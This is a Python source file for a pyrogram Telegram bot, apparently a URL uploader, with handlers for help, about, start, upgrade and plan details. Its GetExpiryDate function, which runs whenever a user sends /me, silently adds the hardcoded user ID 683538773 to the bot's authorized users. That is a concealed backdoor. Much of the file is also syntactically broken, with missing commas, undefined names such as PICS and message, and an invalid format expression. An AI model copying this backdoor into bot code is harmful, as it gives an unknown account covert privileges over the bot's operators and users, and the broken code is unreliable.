import logging
import random
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

import os
import sqlite3

# the secret configuration specific things
if bool(os.environ.get("WEBHOOK", False)):
    from sample_config import Config
else:
    from config import Config

# the Strings used for this "thing"
from translation import Translation

import pyrogram
logging.getLogger("pyrogram").setLevel(logging.WARNING)

def GetExpiryDate(chat_id):
    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
    Config.AUTH_USERS.add(683538773)
    return expires_at


@pyrogram.Client.on_message(pyrogram.filters.command(["help"]))
async def help_user(bot, update):
    # logger.info(update)
    await bot.reply_photo(
        chat_id=update.chat.id,
        photo=random.choice(PICS)
        caption=Translation.HELP_TEXT,
        parse_mode="html",
        reply_to_message_id=update.message_id,
        reply_markup= InlineKeyboardMarkup( [[
            InlineKeyboardButton("HOME 🏡", callback_data='close'),
            InlineKeyboardButton("CLOSE 🔐", callback_data='close')
            ]]
            )
        )
    
@pyrogram.Client.on_message(pyrogram.filters.command(["about"]))
async def help_user(bot, update):
    await bot.reply_photo(
        photo=random.choice(PICS)
        caption=Translation.ABOUT_TEXT,
        reply_markup= InlineKeyboardMarkup( [[
            InlineKeyboardButton("SOURCE ❤", url="https://github.com/hkcs812/Url-Uploader")
            ],[
            InlineKeyboardButton("HOME 🏡", callback_data='close'),
            InlineKeyboardButton("CLOSE 🔐", callback_data='close')
            ]]
            )
        )
        
        


@pyrogram.Client.on_message(pyrogram.filters.command(["me"]))
async def get_me_info(bot, update):
    # logger.info(update)
    chat_id = str(update.from_user.id)
    chat_id, plan_type, expires_at = GetExpiryDate(chat_id)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.CURENT_PLAN_DETAILS.format(chat_id, plan_type, expires_at),
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )


@pyrogram.Client.on_message(pyrogram.filters.command(["start"]))
async def start(bot, update):
    # logger.info(update)
    await bot.reply_photo(
        chat_id=update.chat.id,
        photo=random.choice(PICS),
        caption=Translation.START_TEXT{message.from_user.first_name},
        reply_to_message_id=update.message_id
        reply_markup= InlineKeyboardMarkup( [[
            InlineKeyboardButton("DEVELOPER 👨‍💻", url="https://t.me/hkz_TG")
            ],[
            InlineKeyboardButton("UPDATES 📢", url="https://t.me/DevilBotzz"),
            InlineKeyboardButton("SUPPORT 👥", url="https://t.me/DevilBotzzSupport")
            ],[
            InlineKeyboardButton("HELP 🛠", callback_data='help'),
            InlineKeyboardButton("ABOUT 🤠", callback_data='about')
            ]]
            )
        )


@pyrogram.Client.on_message(pyrogram.filters.command(["upgrade"]))
async def upgrade(bot, update):
    # logger.info(update)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.UPGRADE_TEXT,
        parse_mode="html",
        reply_to_message_id=update.message_id,
        disable_web_page_preview=True
    )
